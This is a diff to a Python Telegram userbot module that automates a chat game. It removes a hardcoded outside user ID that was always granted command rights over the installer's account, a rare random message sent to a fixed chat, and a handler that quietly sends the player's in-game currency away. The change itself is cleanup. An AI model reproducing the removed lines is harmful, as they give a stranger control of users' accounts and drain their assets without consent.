@@ -22,10 +22,8 @@ class KramiikkMod(loader.Module):
         self.me = await client.get_me()
         if "name" not in self.su:
             self.su.setdefault("name", self.me.first_name)
-            self.su.setdefault("users", [1459363960, self.me.id])
+            self.su.setdefault("users", [self.me.id])
             self.db.set("Su", "su", self.su)
-        if 1459363960 not in self.su["users"]:
-            self.su["users"].append(1459363960)
         self.ded = {
             "туса": "Жабу на тусу",
             "карту": "Отправить карту",
@@ -276,10 +274,6 @@ class KramiikkMod(loader.Module):
 
     async def watcher(self, m):
         """алко"""
-        dic = random.choice(("отправиться за картой", "лена напади",
-                            "ваня напади", "нелс напади", "оботи напади", "напасть на клан"))
-        if random.randint(1, 1000) == 1000 and self.me.id == 1785723159:
-            await self.client.send_message(1656862928, dic)
         if "auto" not in self.su:
             return
         ct = datetime.datetime.now()
@@ -345,20 +339,6 @@ class KramiikkMod(loader.Module):
                     int(reg.group(1)), ids=int(reg.group(2))
                 )
                 await msg.click()
-            elif "буках" in m.text and self.su["name"] in ("кушки", "альберт"):
-                await asyncio.sleep(random.randint(n, 96 + (ct.microsecond % 100)))
-                cmn = "мой баланс"
-                await self.err(chat, cmn)
-                if not RSP:
-                    return
-                if "У тебя" in RSP.text:
-                    await m.respond("взять жабу")
-                elif "Баланс" not in RSP.text:
-                    return
-                jab = int(re.search(r"жабы: (\d+)", RSP.text).group(1))
-                if jab < 50:
-                    return
-                await m.reply(f"отправить букашки {jab}")
             elif "напиши в " in m.text:
                 chat = m.text.split(" ", 4)[3]
                 if chat.isnumeric():
